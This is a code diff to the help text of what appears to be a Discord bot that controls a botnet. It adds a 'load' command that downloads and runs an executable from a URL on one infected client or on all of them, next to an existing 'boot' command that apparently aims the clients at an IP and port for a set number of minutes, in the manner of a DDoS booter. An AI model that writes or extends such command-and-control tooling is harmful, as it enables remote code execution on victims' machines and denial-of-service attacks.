@@ -41,6 +41,17 @@ Examples:
     ${client.settings.fallbackPrefix}boot stop                  Removes the boot instructions
 \`\`\``);
             break;
+        case "load":
+            message.channel.send(`\`\`\`
+Command Name: ${client.settings.fallbackPrefix}load
+Description: Sets file for speciffic or all clients to run
+Usage: ${client.settings.fallbackPrefix}load [ID|all] [URL|Acton] 
+Examples:
+    ${client.settings.fallbackPrefix}load 12 http://mysite/myfile.exe     Runs myfile.exe at clients with set ID
+    ${client.settings.fallbackPrefix}load all http://mysite/myfile.exe    Runs myfile.exe at all clients
+    ${client.settings.fallbackPrefix}load 34 status                       Shows run status for clients with ID 34
+\`\`\``);
+            break;
         default:
             message.channel
                 .send(`\`\`\`      ██    ██    ██                                    
@@ -62,8 +73,9 @@ Examples:
 Available Commands:
   ${client.settings.fallbackPrefix}help [CMD]                      Shows usage info    
   ${client.settings.fallbackPrefix}clients [ID|Tag]                Shows clients and info about them
-  ${client.settings.fallbackPrefix}tag <ID> <Tag>                  Sets tag to a spceffic client
-  ${client.settings.fallbackPrefix}boot <IP|Action> [Port] [Mins]  Sets boot instructions for all clients\`\`\``);
+  ${client.settings.fallbackPrefix}tag <ID> <Tag>                  Sets tag to a set client
+  ${client.settings.fallbackPrefix}boot <IP|Action> [Port] [Mins]  Sets boot instructions for all clients
+  ${client.settings.fallbackPrefix}load [ID|all] [URL|Action]      Sets file for set or all clients to run\`\`\``);
             break;
     }
 };
